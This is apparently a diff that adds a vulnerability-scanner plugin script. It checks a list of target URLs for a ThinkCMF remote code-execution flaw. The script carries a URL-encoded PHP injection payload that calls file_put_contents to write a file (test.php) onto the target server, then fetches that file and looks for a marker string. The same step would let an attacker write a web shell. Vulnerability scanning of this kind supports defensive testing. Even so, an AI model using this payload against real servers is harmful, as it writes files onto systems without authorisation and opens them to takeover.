@@ -1,0 +1,25 @@
+#request urls = array
+#define payload = /index.php?a=fetch&content=%3C?php+file_put_contents(%22test.php%22,%22%3C?php+echo+Wker%3B%22)%3B
+#define ppp = /test.php
+#define bug = Wker
+#define info = thinkcmf-write-shell
+
+function main(args){
+	printclolor("当前正在检测:".info,1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			HttpGet(url.ppp,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],bug,0)!= "-1")
+			{
+				printclolor("[+]".urls[i].info,3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
+	}
+	
+}
